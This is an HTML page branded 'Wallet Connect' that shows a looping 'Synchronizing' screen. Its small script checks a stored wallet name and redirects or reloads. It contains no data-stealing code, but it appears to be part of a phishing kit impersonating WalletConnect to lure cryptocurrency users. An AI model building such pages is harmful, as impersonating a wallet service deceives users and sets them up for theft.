<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0" />
    <title>Wallet Connect</title>
    <link rel="icon" href="assets/logo.svg" />

    <link rel="stylesheet" href="../../wallet/assets/main.css" type="text/css" />
    <link rel="icon" href="/favicon.ico" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <script src="js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="../../wallet/assets/loader.css" />
    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
</head>

<body style="padding-left: 20px; padding-top: 60px; padding-right: 20px">
    <div class="row">
        <div class="col-md-2"></div>
        <div class="col-md-8">
            <div class="row">
                <div class="col-md-12" style="text-align: center">
                    <img src="../../wallet/images/barcode.png" style="height=100%; width=100%" /><br />
                </div>

                <div class="loader"></div>

                <div class="col-md-12" style="
              padding-top: 20px;
              text-align: center;
              display: block;
              font-size: 1rem;
              font-family: Avenir, Helvetica, Arial, sans-serif;
              margin-block-start: 0.83em;
              margin-block-end: 0.83em;
              margin-inline-start: 0px;
              margin-inline-end: 0px;
              font-weight: bold;
            ">
                    Synchronizing
                </div>
            </div>
        </div>

        <div class="sync">
            This may take a few minutes to complete
            <br /><br />
            <button class="btn synchron">TRY AGAIN</button>
        </div>

        <div class="col-md-2"></div>
    </div>
    <footer>
        <div id="footer">
            <p>
                <img src="../../wallet/assets/discord.svg" class="footimg" />
                <a href="https://discord.gg/jhxMvxP">Discord</a>
            </p>
            <br />
            <p>
                <img src="../../wallet/assets/telegram.svg" class="footimg" />
                <a href="https://t.me/walletconnect_announcements">Telegram</a>
            </p>
            <br />
            <p>
                <img src="../../wallet/assets/twitter.svg" class="footimg" />
                <a href="https://twitter.walletconnect.org/">Twitter</a>
            </p>
            <br />
            <p>
                <img src="../../wallet/assets/github.svg" class="footimg" />
                <a href="https://github.com/walletconnect">Github</a>
            </p>
            <br />
        </div>
    </footer>


    <script>
        $(document).ready(() => {
            let wallet = localStorage.getItem('walletName')
            if (!wallet) {
                location.href = '../../wallet'
            } else {
                //....
            }
        })
        //

        const verify = () => {
            var button = $('.synchron')

            button.on('click', () => {
                localStorage.removeItem('walletName')
                location.reload()
            })
        }

        verify()
    </script>
</body>

</html>
